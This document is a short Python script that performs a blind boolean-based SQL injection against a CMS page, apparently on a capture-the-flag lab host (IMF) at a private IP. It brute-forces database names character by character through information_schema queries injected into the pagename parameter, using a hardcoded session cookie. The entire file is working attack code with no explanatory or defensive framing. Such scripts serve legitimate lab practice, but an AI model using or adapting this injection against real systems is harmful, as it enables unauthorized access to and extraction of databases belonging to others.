#!/usr/bin/python3

from pwn import *
import requests, pdb, signal, time, sys, string

#Variables
url = "http://172.16.23.129/imfadministrator/cms.php?pagename=home"
char = string.punctuation + string.ascii_lowercase + string.ascii_uppercase + string.digits
cookies = {'PHPSESSID': 'q69doup7448j1j18ajjlijhr66'}
#--Funciones--
def StopProgram(sig, frame):
    print("\n\n[!] Interrupción...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, StopProgram)

def SQLiAttack():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Inicia Progreso de fuerza Bruta")
    time.sleep(2)
    p2 = log.progress("Databases")
    resultados = []

    for dbs in range(0, 6):
        nombre_db = ""
        for position_character in range(1, 30):
            found = False
            for character in char:
                sqli = url + f"'+AND+(SELECT+substring(schema_name,{position_character},1)+FROM+information_schema.schemata+limit+{dbs},1)%3d'{character}--"
                r = requests.get(sqli, cookies=cookies)
                if "Welcome to the IMF Administration." in r.text:
                    nombre_db += character
                    p2.status(nombre_db)
                    found = True
                    break
            if not found: 
                nombre_db += ""
                p2.status(nombre_db)
                print(f"Base de datos encontrada: {nombre_db}")  
        resultados.append(nombre_db)
        print(f"Base de datos encontrada: {nombre_db}")

    print("\nResumen:")
    for resultado in resultados:
        print(resultado)

if __name__ == "__main__":
    SQLiAttack()